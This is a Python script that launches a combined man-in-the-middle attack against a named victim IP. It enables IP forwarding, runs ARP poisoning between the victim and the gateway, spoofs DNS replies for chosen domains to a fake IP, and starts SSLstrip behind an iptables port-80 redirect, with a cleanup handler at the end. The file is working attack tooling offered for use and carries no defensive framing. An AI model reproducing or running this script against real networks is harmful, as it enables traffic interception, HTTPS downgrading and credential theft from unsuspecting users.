import subprocess
import argparse
import os
import signal
import sys


# === Utility ===
def enable_ip_forwarding():
    print("[+] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def disable_ip_forwarding():
    print("[*] Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def flush_iptables():
    print("[*] Flushing iptables rules...")
    os.system("iptables -t nat -F")


def main():
    def setup_sslstrip():
        print("[+] Setting up iptables for SSLstrip...")
        # Redirecting HTTP traffic (port 80) to the port SSLstrip listens on
        os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

    parser = argparse.ArgumentParser(description="Combined ARP + DNS + SSLstrip MITM Launcher")

    # Shared parameters
    parser.add_argument("--iface", required=True, help="Network interface (e.g. eth0)")

    # ARP spoofing
    parser.add_argument("--victim", required=True, help="Victim IP")
    parser.add_argument("--gateway", required=True, help="Gateway IP")
    parser.add_argument("--arp-mode", choices=["silent", "aggressive", "custom"], default="custom")
    parser.add_argument("--arp-sleep", type=float, default=2.0)

    # DNS spoofing
    parser.add_argument("--target-domains", nargs="+", required=True, help="Target domains to spoof")
    parser.add_argument("--spoof-ip", required=True, help="Fake IP to send in DNS replies")
    parser.add_argument("--dns-mode", choices=["silent", "aggressive"], default="silent")

    # SSLstrip
    parser.add_argument("--log", help="Optional log file for sslstrip")

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] You must run this script as root.")
        sys.exit(1)

    enable_ip_forwarding()

    # === Start ARP Spoofing ===
    print("[*] Launching ARP spoofing...")
    arp_cmd = [
        "python", "arp_poisoning.py",
        "--victims", args.victim,
        "--gateway", args.gateway,
        "--iface", args.iface,
        "--mode", args.arp_mode,
        "--sleep", str(args.arp_sleep)
    ]
    arp_proc = subprocess.Popen(arp_cmd)

    # === Start DNS Spoofing ===
    print("[*] Launching DNS spoofing...")
    dns_cmd = [
                  "python", "dns_spoofing.py",
                  "--iface", args.iface,
                  "--target-domains"
              ] + args.target_domains + [
                  "--spoof-ip", args.spoof_ip,
                  "--mode", args.dns_mode
              ]
    dns_proc = subprocess.Popen(dns_cmd)

    # === Start SSLstrip ===
    setup_sslstrip()
    print("[*] Launching SSLstrip...")
    ssl_cmd = ["python", "ssl_strip.py"]
    if args.log:
        ssl_cmd += ["--log", args.log]
    ssl_proc = subprocess.Popen(ssl_cmd)

    # === Handle cleanup ===
    def stop_all(signum, frame):
        print("\n[!] Caught interrupt. Stopping all components...")
        arp_proc.terminate()
        dns_proc.terminate()
        ssl_proc.terminate()
        flush_iptables()
        disable_ip_forwarding()
        print("[+] All cleaned up. Exiting.")
        sys.exit(0)

    signal.signal(signal.SIGINT, stop_all)

    print("[*] All components running. Press Ctrl+C to stop.")
    arp_proc.wait()
    dns_proc.wait()
    ssl_proc.wait()


if __name__ == "__main__":
    main()